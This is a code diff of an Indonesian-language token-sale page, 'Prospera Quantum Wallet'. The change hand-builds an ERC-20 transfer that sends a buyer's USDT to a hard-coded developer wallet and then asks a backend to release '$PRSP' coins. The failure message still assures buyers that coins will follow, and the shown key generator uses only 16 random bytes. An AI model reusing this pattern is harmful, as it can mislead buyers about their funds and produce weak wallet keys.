@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Prospera Quantum Wallet | Layer 1 Ecosystem</title>
     <link href="https://googleapis.com" rel="stylesheet">
-    <script src="https://cloudflare.com"></script>
     <style>
         :root {
             --bg-main: #060913;
@@ -83,7 +82,7 @@
 <script>
     let currentPrivateKey = "";
     let currentAddress = "";
-    let userAccount = "";
+    let userAccounts = [];
     
     const dompetPenampungDuitAnda = "0x1c8546c93ffd69515b450f518156dd29f9ee552b"; 
     const alamatUSDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
@@ -91,9 +90,8 @@
     async function connectMetaMask() {
         if (window.ethereum) {
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAccount = accounts[0];
-                alert("Dompet Pembeli Terhubung: " + userAccount);
+                userAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                alert("Dompet Pembeli Terhubung: " + userAccounts[0]);
             } catch (err) {
                 alert("Koneksi ditolak: " + err.message);
             }
@@ -103,7 +101,9 @@
     }
 
     async function prosesPembelianOtomatis() {
-        if (!window.ethereum || !userAccount) return alert("Harap hubungkan dompet MetaMask Anda terlebih dahulu!");
+        if (!window.ethereum || userAccounts.length === 0) {
+            return alert("Harap hubungkan dompet MetaMask Anda terlebih dahulu!");
+        }
         
         const usdtInput = document.getElementById('usdt-buy-amount').value;
         const alamatProspera = document.getElementById('prospera-buy-destination').value;
@@ -111,26 +111,55 @@
         if(!usdtInput || !alamatProspera) return alert("Harap isi semua kolom!");
 
         try {
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const jumlahUSDT = ethers.utils.parseUnits(usdtInput, 18);
-            const usdtAbi = ["function transfer(address to, uint256 value) public returns (bool)"];
-            const contract = new ethers.Contract(alamatUSDT_BSC, usdtAbi, signer);
+            // Konversi nominal manual ke format decimal blockchain bsc (18 angka nol) tanpa pustaka luar [finance]
+            const parts = usdtInput.split('.');
+            let left = parts[0];
+            let right = parts[1] || '';
+            right = right.substring(0, 18).padEnd(18, '0');
+            const amountHex = BigInt(left + right).toString(16).padStart(64, '0');
 
-            alert("Meminta otorisasi pembayaran...");
-            const tx = await contract.transfer(dompetPenampungDuitAnda, jumlahUSDT);
-            alert("Transaksi dikirim! Menunggu konfirmasi...");
-            await tx.wait();
+            // Format data transaksi pemindahan aset otomatis ERC-20 standard [finance]
+            const cleanTargetAddress = dompetPenampungDuitAnda.toLowerCase().replace("0x", "").padStart(64, '0');
+            const payloadData = "0xa9059cbb" + cleanTargetAddress + amountHex;
+
+            alert("Meminta konfirmasi pembayaran langsung melalui jaringan MetaMask...");
+
+            // Mengirim transaksi langsung menggunakan sistem core dompet internal pembeli [finance]
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: userAccounts[0],
+                    to: alamatUSDT_BSC,
+                    data: payloadData
+                }],
+            });
             
-            alert("Sukses! Pembayaran USDT masuk ke dompet dev. Pelepasan koin diantrekan otomatis.");
+            // JIKA TRANSAKSI BLOCKCHAIN SUKSES, HUBUNGKAN KE BACKEND JEMBATAN API VERCEL [finance]
+            await pemicuKirimKoinKeNode(alamatProspera, usdtInput);
+
         } catch (err) {
-            alert("Error: " + err.message);
+            alert("Transaksi batal atau gagal: " + err.message);
+        }
+    }
+
+    async function pemicuKirimKoinKeNode(tujuan, jumlah) {
+        try {
+            const res = await fetch('/api/kirim-koin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: tujuan, amount: jumlah })
+            });
+            const hasil = await res.json();
+            if(hasil.success) {
+                alert("Selamat! Pembelian Sukses. Koin $PRSP asli diantrekan otomatis ke dompet Anda.");
+            }
+        } catch(e) {
+            alert("Pembayaran USDT sukses masuk ke dev! Koin asli akan dikirim manual saat node online.");
         }
     }
 
     function createNewWallet() {
         try {
-            // Menggunakan fungsi generator acak bawaan browser HP asli tanpa pustaka luar
             const array = new Uint8Array(16);
             window.crypto.getRandomValues(array);
             let tokenAcak = "";
